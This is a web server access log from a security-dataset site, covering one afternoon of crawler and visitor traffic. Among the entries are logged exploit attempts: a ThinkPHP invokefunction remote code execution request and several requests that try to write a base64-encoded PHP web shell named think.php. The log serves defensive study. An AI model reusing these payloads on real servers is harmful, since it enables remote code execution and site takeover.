157.55.39.100 - - [14/Nov/2019:02:30:34 -0800] "GET /self.logs/access.log.2017-11-08.gz HTTP/1.1" 200 30197 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
162.210.196.129 - - [14/Nov/2019:13:51:23 -0800] "GET / HTTP/1.1" 200 12574 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
92.10.49.115 - - [14/Nov/2019:13:55:04 -0800] "GET /favicon.ico HTTP/1.1" 200 302 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
54.36.150.50 - - [14/Nov/2019:13:58:36 -0800] "GET /self.logs/error.log.2017-03-18.gz HTTP/1.1" 200 1010 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.49 - - [14/Nov/2019:14:00:13 -0800] "GET /self.logs/2016/error.log.2016-06-25.gz HTTP/1.1" 200 796 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.43 - - [14/Nov/2019:14:05:24 -0800] "GET /self.logs/error.log.2017-11-08.gz HTTP/1.1" 200 2389 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.131 - - [14/Nov/2019:14:08:04 -0800] "GET /self.logs/access.log.2015-03-04.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
98.213.251.253 - - [14/Nov/2019:14:08:44 -0800] "GET / HTTP/1.1" 200 12618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
98.213.251.253 - - [14/Nov/2019:14:08:44 -0800] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
98.213.251.253 - - [14/Nov/2019:14:08:44 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
98.213.251.253 - - [14/Nov/2019:14:08:44 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
98.213.251.253 - - [14/Nov/2019:14:08:46 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
98.213.251.253 - - [14/Nov/2019:14:08:49 -0800] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
98.213.251.253 - - [14/Nov/2019:14:09:48 -0800] "GET /misc/zeus_dga_domains.txt.zip HTTP/1.1" 200 592292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
98.213.251.253 - - [14/Nov/2019:14:10:25 -0800] "GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1" 301 551 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
98.213.251.253 - - [14/Nov/2019:14:10:25 -0800] "GET /Datasets%20Description/HTML_Bro_log_1/ HTTP/1.1" 200 732 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
98.213.251.253 - - [14/Nov/2019:14:10:25 -0800] "GET /favicon.ico HTTP/1.1" 200 279 "http://www.secrepo.com/Datasets%20Description/HTML_Bro_log_1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
98.213.251.253 - - [14/Nov/2019:14:10:54 -0800] "GET /pe_static/apt1.zip HTTP/1.1" 200 1983350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
98.213.251.253 - - [14/Nov/2019:14:11:08 -0800] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1572 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
120.37.11.229 - - [14/Nov/2019:14:12:57 -0800] "GET /index.php?s=index/think%5capp/invokefunction&function=call_user_func_array&vars%5b0%5d=file_put_contents&vars%5b1%5d%5b%5d=../test.txt&vars%5b1%5d%5b%5d=%3ctitle%3e%b0%d9%b6%c8%d2%bb%cf%c2%a3%ac%c4%e3%be%cd%d6%aa%b5%c0%20%3c/title%3e HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?s=index/think%5capp/invokefunction&function=call_user_func_array&vars%5b0%5d=file_put_contents&vars%5b1%5d%5b%5d=../test.txt&vars%5b1%5d%5b%5d=%3ctitle%3e%b0%d9%b6%c8%d2%bb%cf%c2%a3%ac%c4%e3%be%cd%d6%aa%b5%c0%20%3c/title%3e" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)" 
54.36.149.100 - - [14/Nov/2019:14:16:35 -0800] "GET /self.logs/access.log.2015-02-17.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
46.119.164.7 - - [14/Nov/2019:14:16:54 -0800] "GET / HTTP/1.1" 200 47148 "https://art.goldsoch.info/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MRA 4.6 (build 01425))" 
46.119.164.7 - - [14/Nov/2019:14:16:55 -0800] "GET / HTTP/1.1" 200 47148 "https://art.goldsoch.info/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MRA 4.6 (build 01425))" 
46.119.164.7 - - [14/Nov/2019:14:16:55 -0800] "GET / HTTP/1.1" 200 47148 "https://art.goldsoch.info/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MRA 4.6 (build 01425))" 
54.36.150.115 - - [14/Nov/2019:14:17:16 -0800] "GET /self.logs/access.log.2017-09-01.gz HTTP/1.1" 200 22625 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
147.135.252.34 - - [14/Nov/2019:14:18:12 -0800] "GET / HTTP/1.1" 301 0 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
147.135.252.34 - - [14/Nov/2019:14:18:13 -0800] "GET /internal_error.html HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
98.213.251.253 - - [14/Nov/2019:14:19:05 -0800] "GET / HTTP/1.1" 200 12618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
98.213.251.253 - - [14/Nov/2019:14:19:05 -0800] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
98.213.251.253 - - [14/Nov/2019:14:19:06 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
200.3.193.98 - - [14/Nov/2019:14:18:26 -0800] "GET /Security-Data-Analysis/Lab_2/http.log.zip HTTP/1.1" 200 53279490 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
199.58.86.211 - - [14/Nov/2019:14:19:30 -0800] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.211 - - [14/Nov/2019:14:19:32 -0800] "GET / HTTP/1.1" 200 12574 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
129.33.253.147 - - [14/Nov/2019:14:25:05 -0800] "GET / HTTP/1.1" 200 12618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
129.33.253.147 - - [14/Nov/2019:14:25:05 -0800] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
129.33.253.147 - - [14/Nov/2019:14:25:05 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
129.33.253.147 - - [14/Nov/2019:14:25:05 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
54.36.149.70 - - [14/Nov/2019:14:27:20 -0800] "GET /self.logs/access.log.2017-09-14.gz HTTP/1.1" 200 24692 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.100 - - [14/Nov/2019:14:27:33 -0800] "GET /self.logs/error.log.2016-01-16.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.104 - - [14/Nov/2019:14:29:33 -0800] "GET /self.logs/access.log.2018-09-02.gz HTTP/1.1" 200 20268 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
207.244.109.182 - - [14/Nov/2019:14:31:18 -0800] "GET / HTTP/1.1" 200 12618 "-" "Vienna/7074 (Macintosh; Intel macOS 10_13_6)" 
54.36.150.40 - - [14/Nov/2019:14:32:01 -0800] "GET /self.logs/2015/access.log.2015-04-22.gz HTTP/1.1" 200 14606 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
123.125.71.100 - - [14/Nov/2019:14:37:13 -0800] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928445 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
113.171.224.176 - - [14/Nov/2019:14:43:29 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.150.60 - - [14/Nov/2019:14:44:04 -0800] "GET /self.logs/access.log.2017-05-03.gz HTTP/1.1" 200 28906 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.152 - - [14/Nov/2019:14:47:35 -0800] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.150.72 - - [14/Nov/2019:14:50:55 -0800] "GET /self.logs/2016/access.log.2016-11-26.gz HTTP/1.1" 200 7519 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.170 - - [14/Nov/2019:14:52:16 -0800] "GET /self.logs/2016/error.log.2016-10-17.gz HTTP/1.1" 200 640 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.16 - - [14/Nov/2019:14:54:14 -0800] "GET /self.logs/error.log.2017-07-28.gz HTTP/1.1" 200 697 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
207.46.13.71 - - [14/Nov/2019:14:54:37 -0800] "GET / HTTP/1.1" 200 12618 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.150.82 - - [14/Nov/2019:15:01:34 -0800] "GET /self.logs/error.log.2016-09-12.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
123.125.67.150 - - [14/Nov/2019:15:08:10 -0800] "GET / HTTP/1.1" 301 438 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.215 - - [14/Nov/2019:15:08:10 -0800] "GET / HTTP/1.1" 200 12581 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
111.206.222.149 - - [14/Nov/2019:15:08:11 -0800] "GET /css/style.css HTTP/1.1" 404 250 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
54.36.150.27 - - [14/Nov/2019:15:10:24 -0800] "GET /self.logs/error.log.2019-02-05.gz HTTP/1.1" 200 3735 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.47 - - [14/Nov/2019:15:13:17 -0800] "GET /self.logs/2015/error.log.2015-07-12.gz HTTP/1.1" 200 1172 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
46.229.168.154 - - [14/Nov/2019:15:19:48 -0800] "GET /robots.txt HTTP/1.1" 200 251 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)" 
78.47.108.227 - - [14/Nov/2019:15:26:21 -0800] "GET /robots.txt HTTP/1.1" 301 458 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6" 
78.47.108.227 - - [14/Nov/2019:15:26:23 -0800] "GET /robots.txt HTTP/1.1" 200 251 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6" 
54.36.148.23 - - [14/Nov/2019:15:26:48 -0800] "GET /self.logs/error.log.2015-05-24.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.221 - - [14/Nov/2019:15:29:26 -0800] "GET /self.logs/access.log.2018-07-02.gz HTTP/1.1" 200 45759 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
207.244.109.182 - - [14/Nov/2019:15:31:41 -0800] "GET / HTTP/1.1" 200 12618 "-" "Vienna/7074 (Macintosh; Intel macOS 10_13_6)" 
207.46.13.204 - - [14/Nov/2019:15:33:51 -0800] "GET /self.logs/ HTTP/1.1" 200 19328 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.150.121 - - [14/Nov/2019:15:35:03 -0800] "GET /self.logs/2016/error.log.2016-09-13.gz HTTP/1.1" 200 918 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
107.21.1.8 - - [14/Nov/2019:15:37:00 -0800] "GET / HTTP/1.1" 200 12618 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
107.21.1.8 - - [14/Nov/2019:15:37:00 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/bootstrap/img/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
43.242.104.46 - - [14/Nov/2019:15:37:38 -0800] "GET / HTTP/1.1" 200 12618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36" 
54.36.150.66 - - [14/Nov/2019:15:38:38 -0800] "GET /self.logs/access.log.2018-02-05.gz HTTP/1.1" 200 21852 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
43.242.104.46 - - [14/Nov/2019:15:37:40 -0800] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928459 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36" 
129.204.34.111 - - [14/Nov/2019:15:42:35 -0800] "HEAD / HTTP/1.1" 200 317 "http://www.secrepo.com" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
129.204.34.111 - - [14/Nov/2019:15:42:35 -0800] "HEAD /index.php?g=Comment&m=Widget&a=fetch&templateFile=/../public/index&content=%3C%3fphp+file_put_contents('think.php',base64_decode('PD9waHAgQHByZWdfcmVwbGFjZSgnQCguKilAZScsJ1xcMScsJF9SRVFVRVNUWydhJ10pOyBlY2hvIDEzNDg4ODg4ODg4OyA/Pg=='));&prefix= HTTP/1.1" 404 197 "http://www.secrepo.com/index.php?g=Comment&m=Widget&a=fetch&templateFile=/../public/index&content=<%3fphp+file_put_contents('think.php',base64_decode('PD9waHAgQHByZWdfcmVwbGFjZSgnQCguKilAZScsJ1xcMScsJF9SRVFVRVNUWydhJ10pOyBlY2hvIDEzNDg4ODg4ODg4OyA/Pg=='));&prefix=" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
129.204.34.111 - - [14/Nov/2019:15:42:36 -0800] "HEAD /?a=fetch&templateFile=public/inde&prefix=%27%27&content=%3C%3fphp+file_put_contents('think.php',base64_decode('PD9waHAgQHByZWdfcmVwbGFjZSgnQCguKilAZScsJ1xcMScsJF9SRVFVRVNUWydhJ10pOyBlY2hvIDEzNDg4ODg4ODg4OyA/Pg==')); HTTP/1.1" 200 239 "http://www.secrepo.com/?a=fetch&templateFile=public/inde&prefix=%27%27&content=<%3fphp+file_put_contents('think.php',base64_decode('PD9waHAgQHByZWdfcmVwbGFjZSgnQCguKilAZScsJ1xcMScsJF9SRVFVRVNUWydhJ10pOyBlY2hvIDEzNDg4ODg4ODg4OyA/Pg=='));" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
129.204.34.111 - - [14/Nov/2019:15:42:36 -0800] "GET /think.php HTTP/1.1" 404 216 "https://www.baidu.com" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
113.171.224.176 - - [14/Nov/2019:15:51:51 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
40.77.167.126 - - [14/Nov/2019:15:53:21 -0800] "GET /self.logs/access.log.2018-01-13.gz HTTP/1.1" 301 543 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
199.91.180.96 - - [14/Nov/2019:15:56:27 -0800] "GET / HTTP/1.1" 200 12618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
199.91.180.96 - - [14/Nov/2019:15:56:28 -0800] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
199.91.180.96 - - [14/Nov/2019:15:56:28 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
199.91.180.96 - - [14/Nov/2019:15:56:28 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
199.91.180.96 - - [14/Nov/2019:15:56:29 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
40.77.167.126 - - [14/Nov/2019:16:00:59 -0800] "GET /self.logs/access.log.2018-11-20.gz HTTP/1.1" 304 175 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.149.1 - - [14/Nov/2019:16:31:14 -0800] "GET /self.logs/error.log.2019-09-25.gz HTTP/1.1" 200 867 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.133 - - [14/Nov/2019:16:31:53 -0800] "GET /self.logs/error.log.2019-01-16.gz HTTP/1.1" 200 6115 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.122 - - [14/Nov/2019:16:33:07 -0800] "GET /self.logs/2015/error.log.2015-05-31.gz HTTP/1.1" 200 742 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
64.233.172.13 - - [14/Nov/2019:16:36:14 -0800] "GET / HTTP/1.1" 200 12619 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
64.233.172.13 - - [14/Nov/2019:16:36:14 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
54.36.150.34 - - [14/Nov/2019:16:38:28 -0800] "GET /self.logs/access.log.2017-06-28.gz HTTP/1.1" 200 31185 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.88 - - [14/Nov/2019:16:39:15 -0800] "GET /self.logs/2016/access.log.2016-08-12.gz HTTP/1.1" 200 16413 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.134 - - [14/Nov/2019:16:41:49 -0800] "GET /self.logs/access.log.2017-03-20.gz HTTP/1.1" 200 15969 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
207.46.13.181 - - [14/Nov/2019:16:42:03 -0800] "GET / HTTP/1.1" 200 12619 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
152.8.31.213 - - [14/Nov/2019:16:44:42 -0800] "GET /Datasets%20Description/HTML_Bro_log_2/dns.html HTTP/1.1" 200 1752 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
152.8.31.213 - - [14/Nov/2019:16:44:42 -0800] "GET /favicon.ico HTTP/1.1" 200 279 "http://www.secrepo.com/Datasets%20Description/HTML_Bro_log_2/dns.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
54.36.150.135 - - [14/Nov/2019:16:48:53 -0800] "GET /self.logs/2015/access.log.2015-11-06.gz HTTP/1.1" 200 8550 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.91 - - [14/Nov/2019:16:51:31 -0800] "GET /self.logs/2016/error.log.2016-12-14.gz HTTP/1.1" 200 888 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.32 - - [14/Nov/2019:16:52:16 -0800] "GET /self.logs/access.log.2015-03-16.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
162.210.196.130 - - [14/Nov/2019:16:53:51 -0800] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.130 - - [14/Nov/2019:16:54:00 -0800] "GET / HTTP/1.1" 200 12575 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
66.249.64.139 - - [14/Nov/2019:16:57:11 -0800] "GET /Datasets%20Description/Network/tunnel.html HTTP/1.1" 200 1391 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
113.171.224.176 - - [14/Nov/2019:16:57:24 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.150.44 - - [14/Nov/2019:16:58:58 -0800] "GET /self.logs/access.log.2017-04-17.gz HTTP/1.1" 200 20072 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
40.77.167.126 - - [14/Nov/2019:17:01:42 -0800] "GET /honeypot/honeypot%20-%20howto.pdf HTTP/1.1" 301 533 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.126 - - [14/Nov/2019:17:01:55 -0800] "GET /honeypot/honeypot%20-%20howto.pdf HTTP/1.1" 404 294 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.150.174 - - [14/Nov/2019:17:02:42 -0800] "GET /self.logs/error.log.2017-07-06.gz HTTP/1.1" 200 1060 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
